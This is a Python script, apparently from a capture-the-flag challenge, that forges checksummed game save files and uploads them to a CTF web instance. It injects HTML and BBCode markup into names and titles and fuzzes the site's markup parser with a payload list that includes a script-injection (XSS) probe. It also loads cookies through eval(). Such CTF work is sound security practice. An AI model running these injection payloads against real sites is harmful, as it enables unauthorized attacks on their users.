import os, sys, struct, requests, re
BASE=os.environ.get("BASE","http://27wg1nxt69l0o1gh.instances.ctfcup.online")
os.makedirs("artifacts",exist_ok=True)
OUT=open("artifacts/out.txt","w")
def log(*a):
    s=" ".join(str(x) for x in a); print(s); OUT.write(s+"\n")
def show(label,r,limit=8000):
    log("="*12,label,"="*12); log(r.request.method,r.url,"->",r.status_code,"len",len(r.content))
    log(r.text[:limit]); log()
main=requests.Session(); main.headers['User-Agent']='Mozilla/5.0'
try:
    for k,v in eval(open("artifacts/cookie.txt").read()).items(): main.cookies.set(k,v)
    log("cookie loaded")
except Exception as e: log("cookie err",e)

G3={}
for i,c in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"): G3[c]=0xBB+i
for i,c in enumerate("abcdefghijklmnopqrstuvwxyz"): G3[c]=0xD5+i
for i,c in enumerate("0123456789"): G3[c]=0xA1+i
G3.update({' ':0x00,'!':0xAB,'?':0xAC,'.':0xAD,'-':0xAE,'<':0x3C,'>':0x3E,'"':0x22,"'":0x27,'/':0x2F,'=':0x3D,'(':0x28,')':0x29})
def g3s(t,n=None):
    b=bytes(G3.get(c,0x3F) for c in t)+b'\xff'
    if n: b=b.ljust(n,b'\x00')
    return b
def checksum(data):
    s=0
    for i in range(0,len(data)-len(data)%4,4): s=(s+struct.unpack_from('<I',data,i)[0])&0xFFFFFFFF
    return ((s&0xFFFF)+(s>>16))&0xFFFF
SIZES={0:3884,1:3968,2:3968,3:3968,4:3848,5:3968,6:3968,7:3968,8:3968,9:3968,10:3968,11:3968,12:3968,13:2000}
def make_save(name=b"AGENT", party=None):
    buf=bytearray(0x20000)
    def sec(base,idx,counter,data):
        sc=bytearray(0x1000); sc[0:len(data)]=data
        struct.pack_into('<H',sc,0xFF4,idx); struct.pack_into('<H',sc,0xFF6,checksum(sc[0:SIZES[idx]]))
        struct.pack_into('<I',sc,0xFF8,0x08012025); struct.pack_into('<I',sc,0xFFC,counter)
        buf[base+idx*0x1000:base+(idx+1)*0x1000]=sc
    s0=bytearray(SIZES[0]); s0[0:len(name)]=name; struct.pack_into('<I',s0,0x0A,12345); sec(0,0,100,s0)
    s1=bytearray(SIZES[1]); struct.pack_into('<I',s1,0x234,len(party or []))
    for i,p in enumerate(party or []): s1[0x238+i*100:0x238+(i+1)*100]=p
    sec(0,1,100,s1)
    for i in range(2,14): sec(0,i,100,bytes(SIZES[i]))
    for i in range(14): sec(0xE000,i,50,bytes(SIZES[i]))
    return bytes(buf)
def pkm(nick=b"PIKA", level=50, pid=0x12345678, otid=12345, species=25, hp=10, maxhp=20):
    p=bytearray(100)
    struct.pack_into('<I',p,0,pid); struct.pack_into('<I',p,4,otid)
    p[8:8+10]=nick[:10].ljust(10,b'\x00')
    p[0x12]=2; p[0x14:0x14+7]=b"AGENT\xff\x00"
    struct.pack_into('<I',p,0x54,level)
    struct.pack_into('<H',p,0x56,hp); struct.pack_into('<H',p,0x58,maxhp)
    p[0x5A:0x5C]=struct.pack('<H',hp)
    struct.pack_into('<H',p,0x20,species)
    struct.pack_into('<H',p,0x1C,checksum(bytes(p[0x20:0x50])))
    return bytes(p)

# upload save with raw markup in name/nickname
sv=make_save(b'<b>HI</b>'.ljust(8,b'\xff'), [pkm(b'<img srcx>'), pkm(b'[b]BB[/b]')])
r=main.post(BASE+"/boxes",data={"title":"raw save test","description":"raw desc"},files={'save':('raw.sav',sv)},timeout=30,allow_redirects=False)
log("upload raw ->",r.status_code,r.headers.get('location'))
loc=r.headers.get('location')
if loc:
    r=main.get(loc,timeout=20); show("box raw", r)
# comments section on box 1
r=main.get(BASE+"/box/1",timeout=20)
m=re.search(r'<h2>Comments</h2>.*?</ul>', r.text, re.S)
log("COMMENTS RAW:", repr(m.group(0)) if m else "none")
# markup fuzz boxes
payloads=[
 "[b]a[/b]",
 "[b]a",
 "[/b]a",
 "[shiny=x]a[/shiny]",
 "[b class=x]a[/b]",
 "[B]a[/B]",
 "[b][i]a[/b][/i]",
 "[shiny][b]a[/shiny]",
 "[b]a[/shiny]",
 "[pokeball]a[/pokeball]",
 "[heart][b]x[/b][/heart]",
 "a[b][/b]c",
 "[b]\"><script>alert(5)</script>[/b]",
 "[b]&lt;script&gt;[/b]",
 "[sparkle]a[/sparkle][fire]b[/fire]",
 "[b]a[/b][b]b[/b]",
 "[[b]]a[[/b]]",
 "[b][b]a[/b][/b]",
]
ids=[]
for i,p in enumerate(payloads):
    sv=make_save(b'AGENT\xff')
    r=main.post(BASE+"/boxes",data={"title":p,"description":p},files={'save':('m%d.sav'%i,sv)},timeout=30,allow_redirects=False)
    if r.status_code==303: ids.append(r.headers['location'])
    else: log("upload fail",i,r.status_code)
log("ids",ids)
for loc in ids:
    r=main.get(loc,timeout=20)
    h1=re.search(r'<h1>(.*?)</h1>',r.text,re.S)
    d=re.search(r'<p class="box-desc">(.*?)</p>',r.text,re.S)
    log("BOX",loc,"TITLE:",repr(h1.group(1) if h1 else None),"DESC:",repr(d.group(1) if d else None))
OUT.close()
